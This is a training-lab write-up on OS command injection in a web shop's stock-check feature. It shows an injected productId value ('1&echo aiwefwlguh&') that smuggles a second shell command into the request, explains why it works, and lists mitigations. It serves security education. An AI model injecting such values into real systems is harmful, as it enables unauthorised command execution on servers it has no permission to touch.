# Lab 01 – OS Command Injection, Simple Case

## Lab Overview

**Objective**

Exploit a vulnerable stock check function to execute an operating system command.

The application executes a shell command using user-controlled input without proper validation.

---

# Vulnerability

The stock checker accepts the following request:

```http
GET /product/stock
```

Internally, the application executes:

```bash
stockreport.pl <productID> <storeID>
```

Because user input is inserted directly into the shell command, additional commands can be injected.

---

# Reconnaissance

Navigate to a product page.

Click:

```
Check Stock
```

Intercept the request in Burp Suite.

Example:

```http
GET /product/stock?productId=1&storeId=1
```

---

# Exploitation

Modify the `productId` parameter.

Original:

```text
1
```

Modified:

```text
1&echo aiwefwlguh&
```

Send the modified request.

---

# Successful Result

The response includes:

```text
aiwefwlguh
```

The presence of the injected string confirms that the operating system executed the supplied command.

---

# Why It Works

The shell interprets `&` as a command separator.

Instead of executing only:

```bash
stockreport.pl 1 1
```

the server executes:

```bash
stockreport.pl 1
echo aiwefwlguh
1
```

---

# Impact

Successful exploitation demonstrates that arbitrary operating system commands can be executed on the server.

---

# Mitigation

- Avoid executing OS commands when possible.
- Use platform APIs instead of shell commands.
- Validate all user input using strict allowlists.

---

# Bug Bounty Methodology

1. Locate functionality that executes server-side operations.
2. Intercept the request.
3. Inject a harmless command such as:

```text
echo
```

4. Observe the application's response.
5. Confirm command execution.

---

# Key Learnings

- Visible output is the easiest way to confirm OS Command Injection.
- Simple commands such as `echo` are effective for initial testing.
- Successful command execution confirms a high-impact vulnerability.